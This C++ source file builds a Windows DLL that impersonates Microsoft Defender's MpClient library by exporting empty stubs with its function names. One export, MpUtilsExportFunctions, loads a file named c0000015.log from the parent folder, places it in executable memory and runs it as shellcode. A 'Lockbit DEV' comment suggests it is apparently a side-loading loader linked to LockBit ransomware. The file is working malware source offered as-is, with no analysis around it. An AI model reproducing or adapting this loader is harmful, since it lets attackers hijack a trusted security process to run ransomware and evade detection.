// dllmain.cpp : Defines the entry point for the DLL application.
// dllmain.cpp : Defines the entry point for the DLL application.

#include "pch.h"
#include <stdio.h>
#include <stdlib.h>
#include <string>
#include <direct.h>
#include <cstring>
#include <tchar.h>
#include <iostream>
#include <fstream>

#define _CRT_SECURE_NO_DEPRECATE
#pragma warning (disable : 4996)

void GetCurrentDllPath(TCHAR* dllPath, DWORD size) {
    HMODULE hModule = NULL;
    GetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS |
        GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
        (LPCTSTR)&GetCurrentDllPath, &hModule);
    GetModuleFileName(hModule, dllPath, size);
}


void Main()
{
    char filename[] = "\\..\\c0000015.log";

    TCHAR filePath[MAX_PATH];
    GetCurrentDllPath(filePath, MAX_PATH);

    _tcscat_s(filePath, MAX_PATH, _T(filename));

    //MessageBox(NULL, filePath, "Lockbit DEV", MB_ICONINFORMATION | MB_OK);

    FILE* fp;
    size_t size;
    unsigned char* buffer;

    const char* fullpathfile = reinterpret_cast<const char*>(filePath);


    fp = fopen(fullpathfile, "rb");
    fseek(fp, 0, SEEK_END);
    size = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    buffer = (unsigned char*)malloc(size);

    fread(buffer, size, 1, fp);
    void* exec = VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, buffer, size);
    ((void(*) ())exec)();
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

extern "C" __declspec(dllexport) void MpQueryEngineConfigDword() {}
extern "C" __declspec(dllexport) void MpGetSampleChunk() {}
extern "C" __declspec(dllexport) void MpConveySampleSubmissionResult() {}
extern "C" __declspec(dllexport) void MpSampleSubmit() {}
extern "C" __declspec(dllexport) void MpSampleQuery() {}
extern "C" __declspec(dllexport) void MpUpdateStart() {}
extern "C" __declspec(dllexport) void MpClientUtilExportFunctions() {}
extern "C" __declspec(dllexport) void MpConfigInitialize() {}
extern "C" __declspec(dllexport) void MpConfigOpen() {}
extern "C" __declspec(dllexport) void MpWDEnable() {}
extern "C" __declspec(dllexport) void MpUpdatePlatform() {}
extern "C" __declspec(dllexport) void MpConfigUninitialize() {}
extern "C" __declspec(dllexport) void MpConfigClose() {}
extern "C" __declspec(dllexport) void MpFreeMemory() {}
extern "C" __declspec(dllexport) void MpHandleClose() {}
extern "C" __declspec(dllexport) void MpThreatOpen() {}
extern "C" __declspec(dllexport) void MpThreatEnumerate() {}
extern "C" __declspec(dllexport) void MpScanResult() { }
extern "C" __declspec(dllexport) void MpManagerOpen() {}
extern "C" __declspec(dllexport) void MpScanControl() { }
extern "C" __declspec(dllexport) void MpScanStartEx() {}
extern "C" __declspec(dllexport) void MpCleanOpen() {}
extern "C" __declspec(dllexport) void MpCleanStart() {}
extern "C" __declspec(dllexport) void MpConfigGetValue() {}
extern "C" __declspec(dllexport) void MpUpdateStartEx() {}
extern "C" __declspec(dllexport) void MpManagerVersionQuery() {}
extern "C" __declspec(dllexport) void MpAddDynamicSignatureFile() {}
extern "C" __declspec(dllexport) void MpUtilsExportFunctions() { Main(); }
extern "C" __declspec(dllexport) void MpAllocMemory() {}
extern "C" __declspec(dllexport) void MpConfigSetValue() {}
extern "C" __declspec(dllexport) void MpRemoveDynamicSignatureFile() {}
extern "C" __declspec(dllexport) void MpDynamicSignatureOpen() {}
extern "C" __declspec(dllexport) void MpDynamicSignatureEnumerate() {}
extern "C" __declspec(dllexport) void MpConfigGetValueAlloc() {}
extern "C" __declspec(dllexport) void MpGetTaskSchedulerStrings() {}
extern "C" __declspec(dllexport) void MpManagerStatusQuery() {}
extern "C" __declspec(dllexport) void MpConfigIteratorOpen() {}
extern "C" __declspec(dllexport) void MpConfigIteratorEnum() {}
extern "C" __declspec(dllexport) void MpConfigIteratorClose() {}
extern "C" __declspec(dllexport) void MpNetworkCapture() {}
extern "C" __declspec(dllexport) void MpConfigDelValue() {}
extern "C" __declspec(dllexport) void MpManagerEnable() {}
extern "C" __declspec(dllexport) void MpQuarantineRequest() {}
extern "C" __declspec(dllexport) void MpManagerStatusQueryEx() {}